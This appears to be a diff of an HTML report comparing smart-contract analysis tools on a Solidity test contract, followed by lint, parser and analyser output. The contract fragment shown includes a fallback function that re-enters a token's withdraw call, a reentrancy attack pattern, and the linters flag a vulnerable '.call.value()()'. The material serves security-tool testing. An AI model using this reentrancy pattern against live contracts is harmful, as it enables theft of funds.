+        withdrawnX = 1;
+        return tokenContract.withdraw(value);
+    }
+
+    function () payable {
+        withdrawnX++;
+        if (msg.gas &gt; 10000)
+            tokenContract.withdraw(value);
+    }
+    
+    function _balance() public view returns (uint) { 
+        return this.balance; 
+        
+    }
+}
+
+contract balance {
+    function getBalance(address _contract) public view returns  (uint _balance) {
+        return address(_contract).balance;
+    }
+}
+
+</code></pre></div><div class="contract-tab-content" id="contract-content-contrato-output-mythril"><div class="markdown-content"><p>The analysis was completed successfully. No issues were detected.</p></div></div><div class="contract-tab-content" id="contract-content-contrato-output-oyente"><pre><code class="bash">WARNING:root:You are using evm version 1.8.2. The supported version is 1.7.3
+WARNING:root:You are using solc version 0.4.21, The latest supported version is 0.4.19
+CRITICAL:root:Solidity compilation failed. Please use -ce flag to see the detail.
+</code></pre></div><div class="contract-tab-content" id="contract-content-contrato-output-solhint"><pre><code class="bash">/app/input/contracts_flatten/Contrato.sol
+    1:16  warning  Compiler version must be fixed                                       compiler-fixed
+    5:1   error    Definition must be surrounded with two blank line indent             two-lines-top-level-separator
+    6:5   warning  Explicitly mark visibility of state                                  state-visibility
+    6:21  error    Constant name must be in capitalized SNAKE_CASE                      const-name-snakecase
+    7:5   warning  Explicitly mark visibility of state                                  state-visibility
+    7:21  error    Constant name must be in capitalized SNAKE_CASE                      const-name-snakecase
+    8:5   warning  Explicitly mark visibility of state                                  state-visibility
+    8:20  error    Constant name must be in capitalized SNAKE_CASE                      const-name-snakecase
+    9:5   warning  Explicitly mark visibility of state                                  state-visibility
+   15:5   warning  Explicitly mark visibility of state                                  state-visibility
+   16:5   warning  Explicitly mark visibility of state                                  state-visibility
+   21:26  warning  Explicitly mark visibility in function                               func-visibility
+   25:28  warning  Explicitly mark visibility in function                               func-visibility
+   29:40  warning  Explicitly mark visibility in function                               func-visibility
+   33:24  warning  Explicitly mark visibility in function                               func-visibility
+   41:39  warning  Explicitly mark visibility in function                               func-visibility
+   43:9   error    Avoid to use &quot;.call.value()()&quot;                                       avoid-call-value
+   49:52  warning  Explicitly mark visibility in function                               func-visibility
+   49:5   warning  Event and function names must be different                           no-simple-event-func-name
+   62:5   error    Definitions inside contract / library must be separated by one line  separate-by-one-line-in-contract
+   62:56  warning  Explicitly mark visibility in function                               func-visibility
+   68:58  warning  Explicitly mark visibility in function                               func-visibility
+   72:71  warning  Explicitly mark visibility in function                               func-visibility
+   74:12  error    Statement indentation is incorrect. Required no spaces after (       statement-indent
+   85:1   error    Definition must be surrounded with two blank line indent             two-lines-top-level-separator
+   92:18  error    Expected indentation of 4 spaces but found 17                        indent
+   92:5   warning  Explicitly mark visibility of state                                  state-visibility
+   93:36  error    Expected indentation of 4 spaces but found 35                        indent
+   93:36  warning  Explicitly mark visibility of state                                  state-visibility
+   93:26  error    Variable name must be in mixedCase                                   var-name-mixedcase
+   93:9   warning  Explicitly mark visibility of state                                  state-visibility
+   93:9   error    Expected indentation of 4 spaces but found 8                         indent
+   94:9   error    Expected indentation of 4 spaces but found 8                         indent
+   94:22  error    Expected indentation of 4 spaces but found 21                        indent
+   94:9   warning  Explicitly mark visibility of state                                  state-visibility
+   94:22  warning  Explicitly mark visibility of state                                  state-visibility
+   94:22  error    Definitions inside contract / library must be separated by one line  separate-by-one-line-in-contract
+   96:5   error    Expected indentation of 0 spaces but found 4                         indent
+   98:14  error    Expected indentation of 0 spaces but found 13                        indent
+   98:46  error    Expected indentation of 0 spaces but found 45                        indent
+   98:5   error    Expected indentation of 0 spaces but found 4                         indent
+   98:24  error    Expected indentation of 0 spaces but found 23                        indent
+   98:26  error    Expected indentation of 0 spaces but found 25                        indent
+   98:33  error    Expected indentation of 0 spaces but found 32                        indent
+   98:41  error    Expected indentation of 0 spaces but found 40                        indent
+   98:42  error    Expected indentation of 0 spaces but found 41                        indent
+   98:48  error    Expected indentation of 0 spaces but found 47                        indent
+   98:23  error    Expected indentation of 0 spaces but found 22                        indent
+   99:20  error    Expected indentation of 0 spaces but found 19                        indent
+   99:22  error    Expected indentation of 0 spaces but found 21                        indent
+   99:23  error    Expected indentation of 0 spaces but found 22                        indent
+   99:9   error    Expected indentation of 0 spaces but found 8                         indent
+  100:44  error    Expected indentation of 0 spaces but found 43                        indent
+  100:39  error    Expected indentation of 0 spaces but found 38                        indent
+  100:45  error    Expected indentation of 0 spaces but found 44                        indent
+  100:30  error    Expected indentation of 0 spaces but found 29                        indent
+  100:29  error    Expected indentation of 0 spaces but found 28                        indent
+  100:16  error    Expected indentation of 0 spaces but found 15                        indent
+  100:9   error    Expected indentation of 0 spaces but found 8                         indent
+  100:38  error    Expected indentation of 0 spaces but found 37                        indent
+  101:5   error    Expected indentation of 0 spaces but found 4                         indent
+  103:5   error    Expected indentation of 0 spaces but found 4                         indent
+  103:25  error    Expected indentation of 0 spaces but found 24                        indent
+  103:17  error    Expected indentation of 0 spaces but found 16                        indent
+  103:15  error    Expected indentation of 0 spaces but found 14                        indent
+  103:14  error    Expected indentation of 0 spaces but found 13                        indent
+  104:9   error    Expected indentation of 0 spaces but found 8                         indent
+  104:19  error    Expected indentation of 0 spaces but found 18                        indent
+  104:21  error    Expected indentation of 0 spaces but found 20                        indent
+  105:28  error    Expected indentation of 0 spaces but found 27                        indent
+  105:23  error    Expected indentation of 0 spaces but found 22                        indent
+  105:21  error    Expected indentation of 0 spaces but found 20                        indent
+  105:17  error    Expected indentation of 0 spaces but found 16                        indent
+  105:16  error    Expected indentation of 0 spaces but found 15                        indent
+  105:13  error    Expected indentation of 0 spaces but found 12                        indent
+  105:12  error    Expected indentation of 0 spaces but found 11                        indent
+  105:9   error    Expected indentation of 0 spaces but found 8                         indent
+  106:42  error    Expected indentation of 0 spaces but found 41                        indent
+  106:41  error    Expected indentation of 0 spaces but found 40                        indent
+  106:36  error    Expected indentation of 0 spaces but found 35                        indent
+  106:35  error    Expected indentation of 0 spaces but found 34                        indent
+  106:26  error    Expected indentation of 0 spaces but found 25                        indent
+  106:13  error    Expected indentation of 0 spaces but found 12                        indent
+  106:27  error    Expected indentation of 0 spaces but found 26                        indent
+  107:5   error    Expected indentation of 0 spaces but found 4                         indent
+  109:23  error    Expected indentation of 0 spaces but found 22                        indent
+  109:25  error    Expected indentation of 0 spaces but found 24                        indent
+  109:32  error    Expected indentation of 0 spaces but found 31                        indent
+  109:37  error    Expected indentation of 0 spaces but found 36                        indent
+  109:45  error    Expected indentation of 0 spaces but found 44                        indent
+  109:46  error    Expected indentation of 0 spaces but found 45                        indent
+  109:50  error    Expected indentation of 0 spaces but found 49                        indent
+  109:52  error    Expected indentation of 0 spaces but found 51                        indent
+  109:5   error    Expected indentation of 0 spaces but found 4                         indent
+  109:14  error    Expected indentation of 0 spaces but found 13                        indent
+  109:22  error    Expected indentation of 0 spaces but found 21                        indent
+  110:28  error    Expected indentation of 0 spaces but found 27                        indent
+  110:21  error    Expected indentation of 0 spaces but found 20                        indent
+  110:20  error    Expected indentation of 0 spaces but found 19                        indent
+  110:16  error    Expected indentation of 0 spaces but found 15                        indent
+  110:9   error    Expected indentation of 0 spaces but found 8                         indent
+  112:5   error    Expected indentation of 0 spaces but found 4                         indent
+  115:10  error    Contract name must be in CamelCase                                   contract-name-camelcase
+
+✖ 103 problems (81 errors, 22 warnings)
+
+</code></pre></div><div class="contract-tab-content" id="contract-content-contrato-output-solidity-analyzer"><pre><code class="bash">
+/solidity-analyzer/node_modules/solidity-parser/index.js:39
+      throw e;
+      ^
+SyntaxError: Expected &quot;[&quot;, &quot;constant&quot;, &quot;internal&quot;, &quot;private&quot;, &quot;public&quot;, comment, end of line, identifier, or whitespace but &quot;(&quot; found. Line: 92, Column: 17
+    at peg$buildStructuredError (/solidity-analyzer/node_modules/solidity-parser/build/parser.js:1272:12)
+    at Object.peg$parse [as parse] (/solidity-analyzer/node_modules/solidity-parser/build/parser.js:13858:11)
+    at Object.parse (/solidity-analyzer/node_modules/solidity-parser/index.js:34:23)
+    at Object.parseFile (/solidity-analyzer/node_modules/solidity-parser/index.js:45:17)
+    at Object.revealUnsafeCallsFromFile (/solidity-analyzer/index.js:81:36)
+    at cli (/solidity-analyzer/cli.js:11:34)
+    at Object.&lt;anonymous&gt; (/solidity-analyzer/cli.js:22:1)
+    at Module._compile (module.js:624:30)
+    at Object.Module._extensions..js (module.js:635:10)
+    at Module.load (module.js:545:32)
+</code></pre></div><div class="contract-tab-content" id="contract-content-contrato-output-solium"><pre><code class="bash">contracts_flatten/Contrato.sol
+  21:4     error      No visibility specified explicitly for TestToken function.                 security/enforce-explicit-visibility
+  25:4     error      No visibility specified explicitly for totalSupply function.               security/enforce-explicit-visibility
+  25:27    warning    Use 'view' instead of deprecated 'constant'.                               no-constant
+  29:4     error      No visibility specified explicitly for balanceOf function.                 security/enforce-explicit-visibility
+  29:39    warning    Use 'view' instead of deprecated 'constant'.                               no-constant
+  33:4     error      No visibility specified explicitly for deposit function.                   security/enforce-explicit-visibility
+  41:4     error      No visibility specified explicitly for withdraw function.                  security/enforce-explicit-visibility
+  43:19    error      Consider using 'transfer' in place of 'call.value()'.                      security/no-call-value
+  49:4     error      No visibility specified explicitly for transfer function.                  security/enforce-explicit-visibility
+  56:8     warning    Use emit statements for triggering events.                                 emit
+  62:4     error      No visibility specified explicitly for approve function.                   security/enforce-explicit-visibility
+  64:8     warning    Use emit statements for triggering events.                                 emit
+  68:4     error      No visibility specified explicitly for allowance function.                 security/enforce-explicit-visibility
+  68:57    warning    Use 'view' instead of deprecated 'constant'.                               no-constant
+  72:4     error      No visibility specified explicitly for transferFrom function.              security/enforce-explicit-visibility
+  93:8     warning    Assignment operator must have exactly single space on both sides of it.    operator-whitespace
+  103:4    error      No visibility specified explicitly for fallback function.                  security/enforce-explicit-visibility
+
+✖ 11 errors, 6 warnings found.
+
+</code></pre></div><div class="contract-tab-content" id="contract-content-contrato-output-surya_describe"><pre><code class="bash"></code></pre></div><div class="contract-tab-content" id="contract-content-contrato-output-surya_graph"><img class="tooloutput-image" src="data:image/png;base64,"></div><div class="contract-tab-content" id="contract-content-contrato-output-surya_inheritance"><img class="tooloutput-image" src="data:image/png;base64,"></div><div class="contract-tab-content" id="contract-content-contrato-output-surya_parse"><pre><code class="bash"></code></pre></div></div></div></div></div></div></body></html>
